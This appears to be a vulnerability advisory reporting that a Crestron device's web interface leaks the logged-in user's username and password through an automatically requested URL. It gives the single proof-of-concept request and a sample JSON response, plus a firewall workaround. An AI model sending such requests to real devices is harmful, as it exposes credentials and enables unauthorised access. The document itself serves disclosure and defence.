Introduction
============

"Crestron sets the gold standard for network security by leveraging the
most advanced technologies including 802.1x authentication, AES
encryption, Active DirectoryÂ® credential management, JITC Certification,
SSH, secure CIP, PKI certificates, TLS, and HTTPS, among others, to
provide network security at the product level."

(from the vendor's homepage)


More Details
============

Upon visiting the device's web interface using a web browser, a login
form is displayed requiring to enter username and password to
authenticate. The analysis of sent HTTP traffic revealed that in
addition to the loading of the website, a few more HTTP requests are
automatically triggered. One of the associated responses contains a
username and a password which can be used to authenticate as the
affected user.


Proof of Concept
================

Requesting the URL "http://crestron.example.com/" via a web browser
results in multiple HTTP requests being sent. Among others, the
following URL is requested:

------------------------------------------------------------------------
http://crestron.example.com/aj.html?a=devi&_=[...]
------------------------------------------------------------------------

This request results in a response similar to the following:

------------------------------------------------------------------------
HTTP/1.0 200 OK
Cache-Control: no-cache
Content-type: text/html

{
  "login_ur": 0,
  "front_val": [
    0,
    1
  ],
  "uname": "admin",
  "upassword": "password"
}
------------------------------------------------------------------------

The values for the keys "uname" and "upassword" could be used to
successfully authenticate to the web interface as the affected user.


Workaround
==========

Reachability over the network can be restricted for access to the web
interface, for example by using a firewall.
